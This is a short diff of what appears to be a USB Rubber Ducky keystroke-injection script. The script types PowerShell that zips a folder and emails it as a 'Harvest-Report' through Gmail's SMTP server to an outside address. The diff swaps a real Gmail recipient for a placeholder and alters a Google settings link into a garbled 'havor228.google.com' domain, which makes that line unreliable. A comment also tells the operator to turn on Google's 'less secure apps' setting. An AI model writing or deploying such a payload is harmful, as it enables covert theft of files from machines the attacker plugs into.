@@ -29,7 +29,7 @@ ENTER
 STRING Compress-Archive -Path A -DestinationPath A.zip
 ENTER
 REM --> Report
-REM --> Allow less secure app here https://myaccount.google.com/lesssecureapps
+REM --> Allow less secure app here https://havor228.google.com/lesssecureapps
 DELAY 500
 STRING $SMTPServer = 'smtp.gmail.com'
 ENTER
@@ -43,7 +43,7 @@ STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
 STRING $ReportEmail.From = 'SENDER-EMAIL'
 ENTER
-STRING $ReportEmail.To.Add('havor228@gmail.com')
+STRING $ReportEmail.To.Add('RECEIVER-EMAIL')
 ENTER
 STRING $ReportEmail.Subject = "Harvest-Report"
 ENTER
